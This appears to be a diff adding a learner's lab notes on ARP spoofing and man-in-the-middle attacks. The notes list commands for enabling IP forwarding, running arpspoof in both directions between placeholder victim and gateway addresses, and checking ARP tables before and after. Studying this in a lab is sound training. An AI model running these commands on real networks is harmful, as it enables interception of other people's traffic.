@@ -1,0 +1,38 @@
+Day 2 — OSI Model + ARP Spoofing + MITM
+
+Commands I run:
+
+Check IP address:
+ip a
+
+Check gateway:
+ip route | grep default
+
+Enable IP forwarding:
+sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
+
+Verify IP forwarding:
+cat /proc/sys/net/ipv4/ip_forward
+
+Check ARP table before attack:
+arp -n
+
+ARP spoof — Terminal 1 (tell victim I am router):
+sudo arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
+
+ARP spoof — Terminal 2 (tell router I am victim):
+sudo arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP
+
+Check ARP table after attack:
+arp -n
+
+Wireshark filter for ARP:
+arp
+
+Stop attack:
+Ctrl + C
+
+Disable IP forwarding:
+sudo sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward"
+
+Date: April 2026
